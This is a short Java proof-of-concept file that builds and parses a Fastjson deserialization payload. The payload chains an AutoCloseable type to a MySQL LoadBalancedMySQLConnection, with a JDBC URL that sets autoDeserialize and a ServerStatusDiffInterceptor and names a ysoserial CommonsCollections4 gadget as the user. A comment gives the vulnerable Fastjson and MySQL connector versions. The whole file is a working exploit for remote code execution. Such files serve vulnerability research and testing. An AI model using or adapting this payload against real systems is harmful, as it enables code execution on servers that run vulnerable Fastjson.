package test;

import com.alibaba.fastjson.JSON;

public class Fastjson14_mysql_3 {
  	//<=1.2.68 and mysql 6.0.2-6.0.3可反序列化 
    public static void main(String[] args) throws Exception{
        String payload = "{\r\n"
        		+ "	\"@type\": \"java.lang.AutoCloseable\",\r\n"
        		+ "	\"@type\": \"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\",\r\n"
        		+ "	\"proxy\": {\r\n"
        		+ "		\"connectionString\": {\r\n"
        		+ "			\"url\": \"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections4_calc\"\r\n"
        		+ "		}\r\n"
        		+ "	}\r\n"
        		+ "}\r\n"
        		+ "";
        System.out.println(payload);
    	JSON.parseObject(payload);
    }
}
